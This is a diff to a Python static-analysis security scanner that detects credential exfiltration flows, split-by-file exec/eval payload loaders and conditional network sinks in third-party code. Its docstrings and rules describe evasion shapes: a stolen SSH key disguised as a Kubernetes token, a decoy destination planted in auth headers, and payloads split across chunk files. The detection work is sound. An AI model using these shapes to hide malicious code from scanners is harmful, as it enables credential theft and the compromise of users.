+                or _dotted_path(rhs.func.value) in _NET_SINK_CTOR_MODULE_PATHS
+            )
+            is_ctor_call = is_known_ctor_module and (
+                rhs.func.attr[:1].isupper() or rhs.func.attr in _NET_SINK_CTOR_BASES
+            )
+            is_alias_chain = isinstance(rhs, ast.Name) and rhs.id.lower() in aliases
+            if is_ctor_call or is_alias_chain:
+                for t in a.targets:
+                    if isinstance(t, ast.Name) and t.id.lower() not in aliases:
+                        aliases.add(t.id.lower())
+                        changed = True
+        if not changed:
+            break
+    return frozenset(aliases)
+
+
+def _is_net_sink(func: ast.AST, net_sink_aliases: frozenset[str] = frozenset()) -> bool:
     if isinstance(func, ast.Name):
         return func.id == "urlopen"
     if isinstance(func, ast.Attribute):
         if func.attr in _NET_SINK_ATTRS_ANY:
             return True
         if func.attr in _NET_SINK_ATTRS_BASED:
-            return _attr_base(func.value) in _NET_SINK_BASES
+            base = _attr_base(func.value)
+            return base in _NET_SINK_BASES or base in net_sink_aliases
     return False
 
 
@@ -1303,6 +2515,142 @@ def _cred_tainted_names(tree: ast.AST) -> set[str]:
         if not changed:
             break
     return tainted
+
+
+def _has_incluster_token_path_const(node: ast.AST) -> bool:
+    """True if the subtree contains a string constant naming the K8s in-cluster
+    service-account token mount specifically (not any other credential path)."""
+    for n in ast.walk(node):
+        if (
+            isinstance(n, ast.Constant)
+            and isinstance(n.value, str)
+            and _INCLUSTER_TOKEN_PATH_RE.search(n.value)
+        ):
+            return True
+    return False
+
+
+def _cred_source_classification(node: ast.AST) -> str:
+    """Classifies *node*'s own credential-path string constants (not recursing
+    through names -- callers combine this with the running pure/impure sets for
+    that): 'other' if it contains ANY credential-path literal that is NOT the
+    narrow in-cluster token path -- even when an in-cluster literal ALSO appears,
+    since mixing the two in one expression (e.g. a ternary) makes the value
+    impure; 'incluster' if it contains ONLY in-cluster token literal(s); 'none'
+    if it contains no credential-path literal at all."""
+    has_incluster = False
+    has_other = False
+    for n in ast.walk(node):
+        if isinstance(n, ast.Constant) and isinstance(n.value, str):
+            if _INCLUSTER_TOKEN_PATH_RE.search(n.value):
+                has_incluster = True
+            elif _CRED_PATH_RE.search(n.value):
+                has_other = True
+    if has_other:
+        return "other"
+    if has_incluster:
+        return "incluster"
+    return "none"
+
+
+def _incluster_pure_tainted_names(tree: ast.AST) -> set[str]:
+    """Subset of credential-tainted names whose value derives ONLY from the
+    narrow in-cluster service-account-token path -- never mixed with, or
+    overwritten by, a read from any OTHER credential-path source (.ssh, .aws, a
+    generic secrets mount, etc.) on ANY reaching assignment. This is the
+    source-side half of the CRED_EXFIL_FLOW in-cluster-auth exemption (see its
+    call site below): a name tainted via BOTH an in-cluster read and a generic
+    credential read -- e.g. one branch of an if/else reads the K8s token, the
+    other reads ~/.ssh/id_rsa, into the SAME variable -- is deliberately
+    excluded here, so a mixed flow can never qualify for the exemption. C-135:
+    this closes the specific smuggling attempt of dressing a real stolen
+    credential as if it shared a name with the legitimate in-cluster token."""
+    pure: set[str] = set()
+    impure: set[str] = set()
+    assigns = [n for n in ast.walk(tree) if isinstance(n, ast.Assign)]
+    for _ in range(4):  # small fixpoint, mirrors _cred_tainted_names
+        changed = False
+        for a in assigns:
+            targets = [t.id for t in a.targets if isinstance(t, ast.Name)]
+            if not targets:
+                continue
+            classification = _cred_source_classification(a.value)
+            refs_impure = bool(_names_in(a.value) & impure)
+            refs_pure = bool(_names_in(a.value) & pure)
+            for name in targets:
+                if classification == "other" or refs_impure:
+                    if name not in impure:
+                        impure.add(name)
+                        pure.discard(name)
+                        changed = True
+                elif classification == "incluster" or refs_pure:
+                    if name not in impure and name not in pure:
+                        pure.add(name)
+                        changed = True
+        if not changed:
+            break
+    return pure - impure
+
+
+def _simple_str_const_assigns(tree: ast.AST) -> dict:
+    """Best-effort `name -> literal` map for simple single-target
+    `name = "..."` string assignments -- used only to resolve a destination-host
+    VARIABLE (e.g. `api_server = "https://kubernetes.default.svc"`) for the
+    CRED_EXFIL_FLOW in-cluster-auth exemption's destination check below; not a
+    general dataflow model. An unresolvable name is simply absent from the map,
+    which the destination check below treats as "not confirmed" (fails closed)."""
+    out: dict = {}
+    for n in ast.walk(tree):
+        if (
+            isinstance(n, ast.Assign)
+            and len(n.targets) == 1
+            and isinstance(n.targets[0], ast.Name)
+            and isinstance(n.value, ast.Constant)
+            and isinstance(n.value.value, str)
+        ):
+            out[n.targets[0].id] = n.value.value
+    return out
+
+
+def _resolves_to_incluster_host(subtrees: list, str_map: dict) -> bool:
+    """True if any of *subtrees* contains (directly, or via a name resolved
+    through *str_map*) a literal matching the cluster's own in-cluster API
+    server signal. Fails closed: anything it can't positively resolve is simply
+    not a match."""
+    for subtree in subtrees:
+        for n in ast.walk(subtree):
+            if isinstance(n, ast.Constant) and isinstance(n.value, str):
+                if _INCLUSTER_API_HOST_RE.search(n.value):
+                    return True
+            elif isinstance(n, ast.Name) and n.id in str_map:
+                if _INCLUSTER_API_HOST_RE.search(str_map[n.id]):
+                    return True
+    return False
+
+
+def _is_incluster_auth_exempt(node: ast.Call, hit_names: set, str_map: dict) -> bool:
+    """B-415/C-135: True only when EVERY tainted name in *hit_names* (already
+    confirmed by the caller to derive PURELY from the in-cluster service-account
+    token, via `_incluster_pure_tainted_names`) appears ONLY in an auth-position
+    kwarg (headers=/auth=/cert=, mirroring ENV_EXFIL_FLOW's own _ENV_AUTH_KWARGS
+    exemption) -- never the URL, body, params, or a positional arg -- AND the
+    call's own non-auth-position arguments resolve to the cluster's own API
+    server. Both conditions are read from the SAME non-auth-position subtrees on
+    purpose: a decoy destination string planted inside headers=/auth=/cert=
+    itself must never count as confirming the destination, or a real exfil call
+    could launder its true destination through the very kwarg this exemption
+    trusts (e.g. `headers={"Authorization": tok, "X-Decoy": "kubernetes.default.svc"}`
+    aimed at an attacker host in the URL)."""
+    non_auth_subtrees = [
+        *node.args,
+        *(kw.value for kw in node.keywords if kw.arg not in _ENV_AUTH_KWARGS),
+    ]
+    auth_subtrees = [kw.value for kw in node.keywords if kw.arg in _ENV_AUTH_KWARGS]
+    if any(hit_names & _names_in(s) for s in non_auth_subtrees):
+        return False  # a tainted name also reaches a non-auth position -- real exfil shape
+    if not any(hit_names & _names_in(s) for s in auth_subtrees):
+        return False  # tainted name isn't actually in an auth position at all
+    return _resolves_to_incluster_host(non_auth_subtrees, str_map)
 
 
 def _is_decode_call(node: ast.AST) -> bool:
@@ -1387,6 +2735,21 @@ def _own_bound_names(scope: ast.AST) -> set[str]:
     resolves to. (A nested def/class still contributes its own NAME, which really is
     bound here; only its body is skipped.)
 
+    B-414: a comprehension (list/set/dict/generator) is handled as a SEPARATE early
+    case (see the `_COMPREHENSION_SCOPE_NODES` check just below) rather than folded
+    into this general walk -- its own-bound-names are exactly its `for`-target(s),
+    nothing else can bind a name inside one, and a walk over its body would otherwise
+    wrongly treat a walrus target found there as bound to the COMPREHENSION instead of
+    the scope containing it (PEP 572). This general walk's existing behaviour when it
+    encounters a comprehension node while computing some OTHER (non-comprehension)
+    scope's own bound names is deliberately left as-is: it does not stop at one (no
+    entry was ever added for the four comprehension node types), so it still descends
+    into a comprehension's `elt`/`ifs`/`iter` looking for exactly the things that DO
+    bind in the enclosing scope by real Python semantics -- a walrus target (correct,
+    per PEP 572) -- while a `for`-target inside it matches no case here and is
+    correctly never picked up as the enclosing scope's own (it belongs to the
+    comprehension's own bucket instead, computed by the early-return case below).
+
     Deliberately position-INSENSITIVE within the scope: Python makes a name local to
     a function for the function's ENTIRE body if it is bound anywhere in it, so a
     rebinding on the last line shadows an outer name on the first line too. That part
@@ -1452,6 +2815,28 @@ def _own_bound_names(scope: ast.AST) -> set[str]:
         must stay hidden, yet its shadow is merged only AFTER its own bucket is read.
         Dropping `n` here is necessary but not sufficient; see `_tainted_names_visible`.
     """
+    if isinstance(scope, _COMPREHENSION_SCOPE_NODES):
+        # B-414: a comprehension's OWN bound names are exactly its `for`-clause
+        # targets, across every `ast.comprehension` in `scope.generators` (multiple
+        # `for`s in ONE comprehension share ONE scope -- `[x for a in A for b in B]`
+        # binds both `a` and `b` here, not two nested scopes). Nothing else can bind a
+        # name here: a comprehension has no statements and no `global`/`nonlocal`
+        # (invalid syntax inside one). A walrus (`:=`) found in `elt`/`key`/`value`/
+        # `ifs`/a later `iter` binds to the scope CONTAINING the comprehension instead
+        # (PEP 572 -- "for the purpose of this rule, the containing scope of a nested
+        # comprehension is the scope that contains the outermost comprehension"), never
+        # to the comprehension itself, so those parts are deliberately never walked
+        # here -- see `_external_tainted_names`'s NamedExpr handling, which bubbles a
+        # walrus target's taint past every enclosing comprehension scope to match. A
+        # nested comprehension/lambda reachable from `elt`/`ifs`/a later `iter` gets
+        # its OWN separate scope bucket (`_build_toplevel_owner_map`) and is resolved
+        # on its own pass, exactly like a nested function already is.
+        return {
+            name
+            for gen in scope.generators
+            for name in _assign_target_names(gen.target)
+        }
+
     bound: set[str] = set()
     # Names this scope declares as belonging to an OUTER binding. Collected by the same
     # scope-bounded walk as `bound`, so a declaration inside a nested function is not
@@ -1544,21 +2929,77 @@ def _build_toplevel_owner_map(funcs: list, classes: list | None = None) -> tuple
     islands; real method-closure chaining is out of scope for this fix, unchanged
     from B-205). Recurses into a nested class-within-a-class (`class Outer: class
     Inner: def load(self): ...`) so `Inner`'s methods get scoped too (C-135 round 2
-    found the one-level-only version reopened the same collision for that shape)."""
+    found the one-level-only version reopened the same collision for that shape).
+
+    B-414: a `Lambda` and a comprehension (list/set/dict/generator) ALSO get their own
+    isolated scope bucket now, at ANY nesting depth, the same way a nested function
+    already did -- `ast.Lambda` was already named in `_NESTED_SCOPE_NODES` (implying it
+    should behave like one) but was never actually special-cased here, so a call inside
+    a lambda body was silently owned by the ENCLOSING function instead; a comprehension
+    had no case at all. Lambda reuses `_map_function_scope` below (generic despite the
+    name: it only sets `parent_scope[node] = enclosing` and recurses treating `node`
+    itself as the new scope, which is exactly right for it too). A comprehension gets
+    its own `_map_comprehension_scope` instead of also reusing `_map_function_scope`
+    unmodified: C-135 (self-review) found that blindly attributing EVERY part of a
+    comprehension to its own new bucket reopens a DIFFERENT false negative when a
+    `for`-target's bare name collides with its OWN iterable's bare name (`for cmds in
+    cmds`, an unusual but syntactically ordinary self-referential rebind) -- real
+    Python evaluates only the FIRST generator's iterable in the scope CONTAINING the
+    comprehension (PEP 530), before the comprehension's own `for`-target binding
+    exists at all, so `_own_bound_names(comp_node)` including that same-named target
+    must not shadow the outer occurrence. `_map_comprehension_scope` maps that one
+    expression to the enclosing scope instead, mirroring `_enclosing_evaluated_parts`'s
+    existing precedent for a nested function/lambda's own decorator/default/annotation
+    expressions (also evaluated in the enclosing scope despite sitting inside the
+    nested node). Every other part of the comprehension -- that generator's own
+    target, all `ifs`, every OTHER generator's target/iter (which CAN see earlier
+    targets -- real Python scoping), and elt/key/value -- still belongs to the
+    comprehension's own bucket. Deliberately NOT via `_NESTED_SCOPE_NODES` itself,
+    which also gates `_scope_own_nodes` for unrelated consumers (B-413 layer 2's
+    argv-list resolution, TT4's decode-composing walk) that must keep seeing a
+    comprehension's own calls/assignments as part of the enclosing function -- see
+    `_COMPREHENSION_SCOPE_NODES`'s own comment for why widening `_NESTED_SCOPE_NODES`
+    itself was rejected."""
     owner: dict = {}
     parent_scope: dict = {}
+
+    def _dispatch_child(child: ast.AST, scope: ast.AST) -> None:
+        if isinstance(child, (ast.FunctionDef, ast.AsyncFunctionDef)):
+            _map_function_scope(child, scope)
+        elif isinstance(child, _COMPREHENSION_SCOPE_NODES):
+            _map_comprehension_scope(child, scope)
+        elif isinstance(child, ast.Lambda):
+            _map_function_scope(child, scope)
+        else:
+            _map_scope_subtree(child, scope)
 
     def _map_scope_subtree(node: ast.AST, scope: ast.AST) -> None:
         owner.setdefault(node, scope)
         for child in ast.iter_child_nodes(node):
-            if isinstance(child, (ast.FunctionDef, ast.AsyncFunctionDef)):
-                _map_function_scope(child, scope)
-            else:
-                _map_scope_subtree(child, scope)
+            _dispatch_child(child, scope)
 
     def _map_function_scope(fn: ast.AST, enclosing) -> None:
         parent_scope[fn] = enclosing
         _map_scope_subtree(fn, fn)
+
+    def _map_comprehension_scope(comp_node: ast.AST, enclosing) -> None:
+        """B-414: like `_map_function_scope`, but the FIRST generator's own `iter`
+        expression is mapped to `enclosing`, NOT to `comp_node` -- real Python (PEP
+        530) evaluates only that one expression in the scope CONTAINING the
+        comprehension, before the comprehension's own `for`-target binding exists.
+        Every other part (that generator's own target, every `ifs`, every OTHER
+        generator's target/iter, and elt/key/value) belongs to `comp_node`'s own
+        bucket, same as `_map_function_scope` would give it."""
+        parent_scope[comp_node] = enclosing
+        owner.setdefault(comp_node, comp_node)
+        generators = getattr(comp_node, "generators", None) or ()
+        first_iter = generators[0].iter if generators else None
+        if first_iter is not None:
+            _map_scope_subtree(first_iter, enclosing)
+        for child in ast.iter_child_nodes(comp_node):
+            if child is first_iter:
+                continue  # already mapped to `enclosing` above
+            _dispatch_child(child, comp_node)
 
     for fn in funcs:
         _map_function_scope(fn, None)
@@ -1729,6 +3170,403 @@ def _subtree_calls_decode_composing(node: ast.AST, composing: set[str]) -> bool:
     )
 
 
+# B336: CHUNKED_FILE_EXEC — a locally-defined helper reads and joins MULTIPLE chunked/
+# part files (e.g. `_load.part1.txt`, `.part2.txt`, `.part3.txt`) at runtime, and the
+# assembled result is passed to exec()/eval() -- the "split-by-file" scanner-evasion
+# loader shape (a payload that never exists whole in any single shipped .py file).
+# WARN-only (severity "info"): see analyze_python's own crit/info convention -- this
+# never becomes FAIL on its own, and checks/_vet.py's check_installed_skills routes it
+# through an explicit continue-branch so it can never reach that function's generic
+# crit/cred-exfil fallthrough either (the actual FAIL-capability landmine this design
+# closes for).
+#
+# Three legs, all required:
+#   1. sink        -- a call to exec()/eval() (bare name, in _EXEC_NAMES).
+#   2. source+shape -- the sink's argument traces, via ONE hop through a locally-defined
+#      TOP-LEVEL helper function's own RETURN value (mirrors B-284's
+#      `_remote_returning_funcs`/`_remote_code_load_findings` one-hop pattern, source
+#      swapped from "network fetch" to "multi-file read"), to a helper that reads >=2
+#      files in a loop (accumulated via `.append()`+join or `+=`) or as 2+ unrolled
+#      direct read expressions joined into what it returns. None of the read literal
+#      paths may be a `.py`/`.pyw`/`.pyi` file -- a real multi-file Python import/build
+#      graph is structurally excluded, not just by never touching exec/eval at all.
+#   3. corroborator -- the literal file paths read share one common stem+extension,
+#      the stem ending in an explicit chunk/part marker word (`part`/`chunk`/
+#      `segment`/`piece`), differing only by a numeric index right after that marker
+#      (`_paths_are_chunked`) -- the "chunked/multi-part files" shape. A single
+#      non-chunked file, or 2+ files with unrelated names, does not corroborate and is
+#      NOT flagged (proven by a dedicated fixture). C-135 (independent review, SkillTrust
+#      Bench SC-005 pass) found the original regex required only a bare trailing digit
+#      before the extension -- no marker word at all -- so it also matched ordinary
+#      version-numbered or otherwise-numbered *independent* resource files that are not
+#      fragments of one split payload (e.g. `strings_v1.txt`/`strings_v2.txt`, a
+#      two-locale string table). Requiring an explicit marker word narrows leg 3 to the
+#      documented "chunked/part files" shape and excludes that class of false positive.
+_CHUNK_READ_ATTRS = {"read", "read_text", "read_bytes"}
+_CHUNK_NAME_RE = re.compile(
+    r"^(?P<stem>.*?(?:part|chunk|segment|piece)[._-]?)(?P<idx>\d+)(?P<ext>\.[A-Za-z0-9]+)$",
+    re.IGNORECASE,
+)
+_CHUNK_EXEMPT_EXTS = (".py", ".pyw", ".pyi")
+
+
+def _is_open_call(node: ast.AST) -> bool:
+    """True when *node* is a call to `open(...)` or `<obj>.open(...)` (e.g.
+    `pathlib.Path(p).open()`) -- either spelling of "open a file for reading" this
+    rule's shape needs to recognise."""
+    if not isinstance(node, ast.Call):
+        return False
+    f = node.func
+    return (isinstance(f, ast.Name) and f.id == "open") or (
+        isinstance(f, ast.Attribute) and f.attr == "open"
+    )
+
+
+def _open_read_handle_paths(fn: ast.AST) -> dict[str, str]:
+    """Map a file-handle name -> the literal path it was opened for READING at, within
+    `fn`'s own body -- the read-side twin of `_open_path_bindings` (which tracks
+    WRITE-mode handles for B-284's staged-exec detector). Covers both
+    `with open(P) as h:` and `h = open(P)`. The literal path is "" when the open()
+    argument is not a string constant (the common chunked-loop case, where the open()
+    argument is a loop variable, not a literal) -- callers that need the literal path
+    resolve it some other way (here, from the loop's own iterable); callers that only
+    need to know WHICH names are read-handles use this dict's keys.
+    """
+    out: dict[str, str] = {}
+    for node in _scope_own_nodes(fn):
+        if isinstance(node, ast.With):
+            for item in node.items:
+                if _is_open_call(item.context_expr) and isinstance(item.optional_vars, ast.Name):
+                    call = item.context_expr
+                    path = _literal_str(call.args[0]) if call.args else ""
+                    out[item.optional_vars.id] = path
+        elif isinstance(node, ast.Assign) and _is_open_call(node.value):
+            path = _literal_str(node.value.args[0]) if node.value.args else ""
+            for t in node.targets:
+                if isinstance(t, ast.Name):
+                    out[t.id] = path
+    return out
+
+
+def _is_file_read_chain(node: ast.AST, handles: set) -> bool:
+    """True for `open(...).read()`-family chained directly, or `h.read()`-family where
+    `h` is a name in `handles` (bound by a `with open(...) as h:` / `h = open(...)` in
+    the same function scope)."""
+    if not isinstance(node, ast.Call):
+        return False
+    f = node.func
+    if not (isinstance(f, ast.Attribute) and f.attr in _CHUNK_READ_ATTRS):
+        return False
+    recv = f.value
+    if isinstance(recv, ast.Name) and recv.id in handles:
+        return True
+    return _is_open_call(recv)
+
+
+def _paths_are_chunked(paths: list) -> bool:
+    """Leg 3 corroborator: True when >=2 of *paths* share one (stem, extension) pair,
+    the stem ending in an explicit chunk/part marker word, differing only by a numeric
+    index right after that marker -- e.g. `_load.part1.txt` / `.part2.txt`. An ordinary
+    numbered filename with no marker word (`strings_v1.txt` / `strings_v2.txt`) does
+    NOT corroborate -- see `_CHUNK_NAME_RE`. Any unresolved ("") path, or any path
+    ending in a Python source extension (`_CHUNK_EXEMPT_EXTS` -- a real multi-file
+    Python import/build graph), disqualifies the WHOLE set: never fabricate a leg-3
+    pass from unresolved or out-of-scope data."""
+    if len(paths) < 2:
+        return False
+    groups: dict = {}
+    for p in paths:
+        if not p:
+            return False
+        base = p.rsplit("/", 1)[-1]
+        if base.lower().endswith(_CHUNK_EXEMPT_EXTS):
+            return False
+        m = _CHUNK_NAME_RE.match(base)
+        if not m:
+            continue
+        key = (m.group("stem"), m.group("ext").lower())
+        groups.setdefault(key, set()).add(m.group("idx"))
+    return any(len(idxs) >= 2 for idxs in groups.values())
+
+
+def _resolve_iter_literal_paths(iter_node: ast.AST, tree: ast.AST, fn: ast.AST) -> list:
+    """Resolve a `for x in <iter_node>:` iterable to a list of literal path strings --
+    either an inline List/Tuple literal, or a Name bound EXACTLY ONCE to one (checked
+    in `fn`'s own scope first, then module scope -- `_single_list_bindings_local`'s
+    existing single-binding discipline, reused verbatim from its subprocess-argv use).
+    Returns [] (never fabricates a partial resolution) when the iterable isn't provably
+    one of those two shapes."""
+    target = iter_node
+    if isinstance(target, ast.Name):
+        local = _single_list_bindings_local(fn).get(target.id)
+        target = local if local is not None else _single_list_bindings_local(tree).get(target.id)
+    if isinstance(target, (ast.List, ast.Tuple)):
+        return [_literal_str(e) for e in target.elts]
+    return []
+
+
+def _chunked_read_composing_funcnames(tree: ast.AST) -> dict:
+    """Leg 2: MODULE-LEVEL function names that compose a chunked multi-file read into
+    their own RETURN value, mapped to the literal file paths they read -- the read-side
+    twin of `_decode_composing_funcnames`/`_function_composes_decode`, restricted to
+    top-level functions only for the same C-135 same-name-collision reason (a
+    module-level `def` name is unique within a file).
+
+    Two shapes, either satisfies:
+      - loop form: a `for`/`async for` loop reads >=2 files (via a handle from
+        `_open_read_handle_paths`, or `open(...).read()`-family chained directly) and
+        accumulates them (`.append()` to a list, or `+=`) into a name that flows
+        (through a small fixpoint, mirroring `_function_composes_decode`'s own
+        4-iteration bound) into the function's own `return`. The literal paths are
+        resolved from the loop's OWN iterable via `_resolve_iter_literal_paths`.
+      - unrolled form: the function's own `return` expression directly contains 2+
+        file-read-chain expressions (`a.read() + b.read()`, `"".join([a.read(),
+        b.read()])`) -- the literal paths are each read's own `open(...)` literal arg.
+
+    A function satisfying neither shape is simply absent from the returned dict --
+    this is a detection gate, not a taint-completeness guarantee (Best-effort, like the
+    rest of this module)."""
+    funcs = [
+        n
+        for n in getattr(tree, "body", [])
+        if isinstance(n, (ast.FunctionDef, ast.AsyncFunctionDef))
+    ]
+    composing: dict = {}
+    for fn in funcs:
+        own_nodes = list(_scope_own_nodes(fn))
+        handle_paths = _open_read_handle_paths(fn)
+        handles = set(handle_paths)
+
+        # Find an accumulator name fed by a read-chain: `acc.append(<read-chain>)` or
+        # `acc += <read-chain>`.
+        accumulator = None
+        for node in own_nodes:
+            if (
+                isinstance(node, ast.Call)
+                and isinstance(node.func, ast.Attribute)
+                and node.func.attr == "append"
+                and isinstance(node.func.value, ast.Name)
+                and any(_is_file_read_chain(n, handles) for a in node.args for n in ast.walk(a))
+            ):
+                accumulator = node.func.value.id
+                break
+            if (
+                isinstance(node, ast.AugAssign)
+                and isinstance(node.op, ast.Add)
+                and isinstance(node.target, ast.Name)
+                and any(_is_file_read_chain(n, handles) for n in ast.walk(node.value))
+            ):
+                accumulator = node.target.id
+                break
+
+        matched = False
+        paths: list = []
+
+        if accumulator is not None:
+            tainted = {accumulator}
+            for _ in range(4):
+                changed = False
+                for node in own_nodes:
+                    if isinstance(node, ast.Assign) and (_names_in(node.value) & tainted):
+                        for t in node.targets:
+                            if isinstance(t, ast.Name) and t.id not in tainted:
+                                tainted.add(t.id)
+                                changed = True
+                if not changed:
+                    break
+            for node in own_nodes:
+                if isinstance(node, ast.Return) and node.value is not None:
+                    if _names_in(node.value) & tainted:
+                        matched = True
+                        break
+            if matched:
+                for node in own_nodes:
+                    if isinstance(node, (ast.For, ast.AsyncFor)):
+                        loop_paths = _resolve_iter_literal_paths(node.iter, tree, fn)
+                        if loop_paths:
+                            paths = loop_paths
+                            break
+
+        if not matched:
+            # Unrolled form: 2+ direct file-read-chain expressions inside the
+            # function's own return.
+            for node in own_nodes:
+                if isinstance(node, ast.Return) and node.value is not None:
+                    reads = [n for n in ast.walk(node.value) if _is_file_read_chain(n, handles)]
+                    if len(reads) >= 2:
+                        matched = True
+                        for r in reads:
+                            recv = r.func.value
+                            if isinstance(recv, ast.Name) and recv.id in handle_paths:
+                                paths.append(handle_paths[recv.id])
+                            elif _is_open_call(recv) and recv.args:
+                                paths.append(_literal_str(recv.args[0]))
+                            else:
+                                paths.append("")
+                        break
+
+        if matched:
+            composing[fn.name] = paths
+    return composing
+
+
+def _chunked_file_exec_findings(tree: ast.AST) -> list:
+    """(lineno, reason) for every exec/eval sink fed by a chunked-multi-file-read-
+    composing helper (see `_chunked_read_composing_funcnames`), gated on the leg-3
+    chunk-naming corroborator (`_paths_are_chunked`). Mirrors `_remote_code_load_
+    findings`'s taint-hop shape for the assigned-then-passed form (`src = _load();
+    exec(src)`), and additionally matches the inline form (`exec(compile(_load(), ...))`)
+    via the same bare-name-call test `_subtree_calls_decode_composing` uses -- with one
+    deliberate difference: the taint fixpoint here is SCOPE-AWARE (bucketed per owning
+    scope via `_build_toplevel_owner_map`/`_tainted_names_visible`, the same model
+    `_tainted_names` already uses for the decode->exec check), where `_remote_code_
+    load_findings` still matches tainted names as bare strings module-wide.
+
+    C-135 (independent review, SkillTrustBench SC-005 pass) found that a module-wide,
+    scope-blind fixpoint let an unrelated function elsewhere in the file -- one that
+    merely reuses the same bare identifier for its OWN local (a very common real-world
+    shape with generic names like `data`/`content`/`template`/`result`) -- have its own,
+    unrelated exec()/eval() call wrongly flagged as "fed by chunked files," even with
+    zero actual data flow between the two. composing_names (leg 2) are already
+    restricted to unique top-level def names, so there is no decode-composing-style
+    `global`/`nonlocal` indirection specific to THAT set to resolve -- but the taint a
+    hop introduces still needs to respect ordinary lexical scoping once it starts
+    propagating through further name-to-name assignments, exactly like decode taint
+    does.
+
+    B-417 (independent review, C-135 follow-up): when a file has MORE THAN ONE
+    composing helper, leg 3 used to be evaluated against the UNION of every composing
+    helper's paths in the file, not just whichever one actually fed THIS sink -- so an
+    unrelated helper that happens to read genuinely chunked DATA files (e.g. a schema
+    index sharded to stay under a hosting limit) could donate chunk-shaped path
+    evidence to a completely different, non-chunked exec()/eval() call elsewhere in the
+    same file. Fixed by running the taint fixpoint ONCE PER composing helper, seeded
+    only from calls to that one helper (`_propagate`), so each sink's `fed_paths` are
+    attributed to exactly the helper(s) that actually flow into it -- still the union of
+    every helper that GENUINELY feeds a given sink (e.g. `exec(a() + b())`), just never
+    a helper that plays no part in that particular call."""
+    composing = _chunked_read_composing_funcnames(tree)
+    if not composing:
+        return []
+    composing_names = set(composing)
+
+    _toplevel_funcs = [
+        n for n in getattr(tree, "body", []) if isinstance(n, (ast.FunctionDef, ast.AsyncFunctionDef))
+    ]
+    _toplevel_classes = [n for n in getattr(tree, "body", []) if isinstance(n, ast.ClassDef)]
+    owner_map, parent_scope = _build_toplevel_owner_map(_toplevel_funcs, _toplevel_classes)
+    shadow_cache: dict = {}
+    assigns = [n for n in ast.walk(tree) if isinstance(n, ast.Assign)]
+
+    def _propagate(seed_names: set) -> dict:
+        """The same scope-aware taint fixpoint as before, but seeded ONLY from calls to
+        `seed_names` (a subset of composing_names) rather than every composing helper in
+        the file -- lets the caller ask "what does exactly THIS helper's return value
+        taint," so leg-3 evidence can be attributed per-helper instead of unioned across
+        every composing helper (the B-417 bug this fixes). Returns the same
+        `owning-scope -> tainted names` shape the original single combined fixpoint did."""
+        tainted: dict = {}  # owning scope node (or None = module level) -> tainted names
+        for _ in range(6):
+            changed = False
+            for a in assigns:
+                hop = any(
+                    isinstance(sub, ast.Call)
+                    and isinstance(sub.func, ast.Name)
+                    and sub.func.id in seed_names
+                    for sub in ast.walk(a.value)
+                )
+                visible = _tainted_names_visible(a, tainted, owner_map, parent_scope, shadow_cache)
+                if not (hop or (_names_in(a.value) & visible)):
+                    continue
+                scope = owner_map.get(a)
+                global_names = _global_declared_names(scope, owner_map) if scope is not None else set()
+                nonlocal_names = (
+                    _nonlocal_declared_names(scope, owner_map) if scope is not None else set()
+                )
+                for t in a.targets:
+                    if not isinstance(t, ast.Name):
+                        continue
+                    if t.id in global_names:
+                        bucket_keys = [None]
+                    elif t.id in nonlocal_names:
+                        targets = _nonlocal_target_scopes(
+                            t.id, scope, parent_scope, owner_map, shadow_cache, {}
+                        )
+                        if not targets:
+                            targets = []
+                            ancestor = parent_scope.get(scope)
+                            while ancestor is not None:
+                                targets.append(ancestor)
+                                ancestor = parent_scope.get(ancestor)
+                        bucket_keys = targets
+                    else:
+                        bucket_keys = [scope]
+                    for key in bucket_keys:
+                        bucket = tainted.setdefault(key, set())
+                        if t.id not in bucket:
+                            bucket.add(t.id)
+                            changed = True
+            if not changed:
+                break
+        return tainted
+
+    # One fixpoint per composing helper, each seeded ONLY from that helper's own calls
+    # -- isolates every helper's taint from every OTHER composing helper's, so a sink
+    # fed by helper A never inherits helper B's (possibly chunked) paths just because
+    # both live in the same file.
+    tainted_by_helper = {name: _propagate({name}) for name in composing_names}
+
+    found: list = []
+    for node in ast.walk(tree):
+        if not isinstance(node, ast.Call):
+            continue
+        f = node.func
+        if not (isinstance(f, ast.Name) and f.id in _EXEC_NAMES):
+            continue
+
+        call_arg_nodes = [
+            n
+            for arg in list(node.args) + [kw.value for kw in node.keywords]
+            for n in ast.walk(arg)
+        ]
+        feeding: set = set()
+        for cname, tainted in tainted_by_helper.items():
+            visible_tainted = _tainted_names_visible(
+                node, tainted, owner_map, parent_scope, shadow_cache
+            )
+            any_t, _direct = _call_args_tainted(node, visible_tainted)
+            inline = any(
+                isinstance(n, ast.Call) and isinstance(n.func, ast.Name) and n.func.id == cname
+                for n in call_arg_nodes
+            )
+            if any_t or inline:
+                feeding.add(cname)
+        if not feeding:
+            continue
+
+        # fed_paths is the union of ONLY the helper(s) actually feeding THIS call --
+        # e.g. `exec(a() + b())` still unions a's and b's paths (both genuinely feed
+        # it), but a THIRD, unrelated composing helper elsewhere in the file never
+        # contributes, however chunk-shaped ITS own paths happen to look (B-417).
+        fed_paths = []
+        for cname in feeding:
+            for p in composing[cname]:
+                if p not in fed_paths:
+                    fed_paths.append(p)
+        if not _paths_are_chunked(fed_paths):
+            continue
+        extra = "..." if len(fed_paths) > 3 else ""
+        found.append(
+            (
+                getattr(node, "lineno", 0),
+                f"exec()/eval() executes content assembled by reading {len(fed_paths)} "
+                f"chunked files ({', '.join(fed_paths[:3])}{extra}) — split-by-file "
+                "payload-loader shape",
+            )
+        )
+    return found
+
+
 # F-058: code-level time-bomb / sandbox-evasion. Narrow on purpose — wall-clock date
 # (datetime.now()/date.today()/utcnow) and environment presence (os.environ / os.getenv)
 # only; NOT time.time() elapsed-timeouts or sys.platform checks, which are ordinary flow.
@@ -1872,6 +3710,7 @@ def _conditional_sink_findings(tree: ast.AST) -> list:
     pattern, distinct from B65's prose sleeper-trigger. WARN-grade (conditional execution
     has legit uses): the checks engine routes CONDITIONAL_SINK to a WARN, never an automatic FAIL."""
     out = []
+    net_sink_aliases = _net_sink_alias_names(tree)
     for node in ast.walk(tree):
         if not isinstance(node, ast.If):
             continue
@@ -1883,7 +3722,7 @@ def _conditional_sink_findings(tree: ast.AST) -> list:
             for sub in ast.walk(stmt):
                 if isinstance(sub, ast.Call):
                     is_exec, sink = _is_exec_sink_call(sub.func)
-                    if is_exec or _is_net_sink(sub.func):
+                    if is_exec or _is_net_sink(sub.func, net_sink_aliases):
                         ln = getattr(sub, "lineno", getattr(node, "lineno", 0))
                         out.append(
                             ASTFinding(
@@ -2235,6 +4074,10 @@ def analyze_python(
         # interpolated command string — independent of taint (this is a shape check,
